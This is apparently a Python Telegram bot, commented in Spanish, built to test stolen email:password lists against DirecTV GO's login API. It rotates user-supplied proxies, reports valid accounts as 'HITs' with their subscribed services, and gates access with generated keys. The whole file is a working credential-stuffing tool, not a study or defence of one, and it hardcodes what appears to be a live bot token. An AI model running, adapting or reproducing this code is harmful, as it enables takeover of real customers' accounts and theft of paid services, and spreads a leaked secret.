import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import os
import time
import random
import asyncio
import requests
import json
from bs4 import BeautifulSoup
import string
import secrets

# --- CONFIGURACIÓN ---
TOKEN = "8381591664:AAGmm-mClGvxHvMyssKmQW2xjxwyVfpzCTI"
ADMIN_IDS = [7590578210]  # Tu ID de Telegram (entero)

# Almacenamiento de usuarios
user_data = {}

# --- FUNCIONES AUXILIARES ---
def get_user_state(user_id):
    if user_id not in user_data:
        user_data[user_id] = {
            "key": None,
            "proxy": None,
            "combo_file": None,
            "is_running": False,
            "progress": 0,
            "total": 0,
            "hits": [],
            "start_time": None
        }
    return user_data[user_id]

def is_admin(user_id):
    return user_id in ADMIN_IDS

def get_proxy_dict(proxy_url):
    if proxy_url:
        return {"http": proxy_url, "https": proxy_url}
    return None

# --- VERIFICACIÓN REAL EN DIRECTVGO ---
async def check_directvgo(combo, proxy_url=None):
    try:
        email, password = combo.split(":", 1)
    except ValueError:
        return {"success": False, "reason": "Formato inválido (email:pass)"}

    proxies = get_proxy_dict(proxy_url) if proxy_url else None

    url = "https://api.directvgo.com/auth/login"
    payload = {"email": email, "password": password}
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Content-Type": "application/json",
        "Origin": "https://directvgo.com",
        "Referer": "https://directvgo.com/"
    }

    try:
        resp = requests.post(url, json=payload, headers=headers, proxies=proxies, timeout=10)
        if resp.status_code == 200:
            try:
                data = resp.json()
                if data.get("status") == "success":
                    user_info = data.get("data", {})
                    services = user_info.get("services", [])
                    user_id = user_info.get("user_id", "N/A")
                    service_list = ", ".join(services) if services else "SIN SERVICIOS"
                    return {
                        "success": True,
                        "service": service_list,
                        "client_id": str(user_id),
                        "link": None,
                        "combo": combo
                    }
            except json.JSONDecodeError:
                pass
        return {"success": False, "reason": "Credenciales inválidas"}
    except Exception as e:
        return {"success": False, "reason": f"Error: {str(e)}"}

# --- COMANDOS DEL BOT ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("""
📡 **Directvgo Checker Bot (100% Real)**

📌 Comandos:
• /activate <KEY> → activar key
• /proxy <http://user:pass@host:port> → guardar proxy
• /upload → enviar combo.txt
• /run → verificar combos
• /cancel → detener
• /me → ver estado

🔐 Admins:
• /gen <cantidad> <días>
• /deluser <user_id>
""")

async def activate(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if len(context.args) != 1:
        await update.message.reply_text("❌ Usa: /activate KEY_123456")
        return
    key = context.args[0]
    if key.startswith("KEY_"):
        get_user_state(user_id)["key"] = key
        await update.message.reply_text("✅ KEY activada.")
    else:
        await update.message.reply_text("❌ KEY inválida.")

async def proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if len(context.args) != 1:
        await update.message.reply_text("❌ Usa: /proxy http://user:pass@host:port")
        return
    proxy_url = context.args[0]
    if not proxy_url.startswith(("http://", "https://")):
        await update.message.reply_text("❌ Proxy inválido.")
        return
    get_user_state(user_id)["proxy"] = proxy_url
    await update.message.reply_text("✅ Proxy guardado.")

async def upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not update.message.document or not update.message.document.file_name.endswith(".txt"):
        await update.message.reply_text("❌ Envía un archivo .txt")
        return

    file = await context.bot.get_file(update.message.document.file_id)
    path = f"combos_{user_id}.txt"
    await file.download_to_drive(path)

    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
        lines = [l.strip() for l in f if ':' in l and l.strip()]

    if not lines:
        os.remove(path)
        await update.message.reply_text("❌ Archivo vacío o sin formato email:pass")
        return

    state = get_user_state(user_id)
    state["combo_file"] = path
    state["total"] = len(lines)
    await update.message.reply_text(f"✅ Combo cargado ({len(lines)} líneas). Ejecuta /run.")

async def run(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    state = get_user_state(user_id)

    if not state["key"]:
        await update.message.reply_text("❌ Activa tu KEY con /activate")
        return
    if not state["combo_file"]:
        await update.message.reply_text("❌ Sube tu combo con /upload")
        return
    if state["is_running"]:
        await update.message.reply_text("❌ Ya se está ejecutando.")
        return

    state["is_running"] = True
    state["hits"] = []
    state["start_time"] = time.time()

    with open(state["combo_file"], 'r', encoding='utf-8', errors='ignore') as f:
        combos = [l.strip() for l in f if ':' in l and l.strip()]

    total = len(combos)
    await update.message.reply_text(f"▶️ Iniciando verificación REAL en Directvgo: {total} combos.")

    for i, combo in enumerate(combos, 1):
        if not state["is_running"]:
            break

        result = await check_directvgo(combo, state["proxy"])

        if result["success"]:
            hit_msg = f"✅ HIT: {result['combo']} | {result['service']} | user_id: {result['client_id']}"
            state["hits"].append(hit_msg)
            await update.message.reply_text(hit_msg)
        else:
            await update.message.reply_text(f"❌ {result['reason']}")

        if i % 10 == 0 or i == total:
            await update.message.reply_text(f"✅ Progreso: {i}/{total}")

    state["is_running"] = False
    if os.path.exists(state["combo_file"]):
        os.remove(state["combo_file"])
    state["combo_file"] = None
    await update.message.reply_text(f"🏁 Finalizado.\n🎯 HITS válidos: {len(state['hits'])}")

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    state = get_user_state(user_id)
    if state["is_running"]:
        state["is_running"] = False
        await update.message.reply_text("🛑 Detenido.")
    else:
        await update.message.reply_text("❌ No hay proceso activo.")

async def me(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    state = get_user_state(user_id)
    key_status = "✅ Activada" if state["key"] else "❌ No activada"
    proxy_status = "✅ Configurado" if state["proxy"] else "❌ No configurado"
    combo_status = f"✅ Cargado ({state['total']} líneas)" if state["combo_file"] else "❌ No cargado"
    running_status = "✅ En ejecución" if state["is_running"] else "❌ Detenido"
    msg = f"""
👤 Estado:
🔑 Key: {key_status}
🌐 Proxy: {proxy_status}
📁 Combo: {combo_status}
⚙️ Estado: {running_status}
🎯 Hits: {len(state['hits'])}
"""
    await update.message.reply_text(msg)

# --- COMANDOS DE ADMIN ---
async def gen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ No tienes permisos de administrador.")
        return
    if len(context.args) != 2:
        await update.message.reply_text("❌ Usa: /gen <cantidad> <días>")
        return
    try:
        cantidad = int(context.args[0])
        dias = int(context.args[1])
        if cantidad <= 0 or dias <= 0 or cantidad > 100:
            await update.message.reply_text("❌ Cantidad o días inválidos (máx 100).")
            return
    except ValueError:
        await update.message.reply_text("❌ Usa números enteros.")
        return

    keys = [f"KEY_{''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(8))}" for _ in range(cantidad)]
    await update.message.reply_text(f"🔑 Generadas {cantidad} keys:\n\n" + "\n".join(keys))

async def deluser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ No tienes permisos.")
        return
    if len(context.args) != 1:
        await update.message.reply_text("❌ Usa: /deluser <user_id>")
        return
    try:
        target_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌ El user_id debe ser un número.")
        return

    if target_id in user_data:
        del user_data[target_id]
        await update.message.reply_text(f"✅ Usuario {target_id} eliminado.")
    else:
        await update.message.reply_text(f"⚠️ Usuario {target_id} no encontrado.")

# --- INICIO ---
def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("activate", activate))
    app.add_handler(CommandHandler("proxy", proxy))
    app.add_handler(CommandHandler("upload", upload))
    app.add_handler(CommandHandler("run", run))
    app.add_handler(CommandHandler("cancel", cancel))
    app.add_handler(CommandHandler("me", me))
    app.add_handler(CommandHandler("gen", gen))
    app.add_handler(CommandHandler("deluser", deluser))
    app.add_handler(MessageHandler(filters.Document.ALL & ~filters.COMMAND, upload))
    print("✅ Bot de Directvgo REAL iniciado. ¡Listo!")
    app.run_polling()

if __name__ == "__main__":
    main()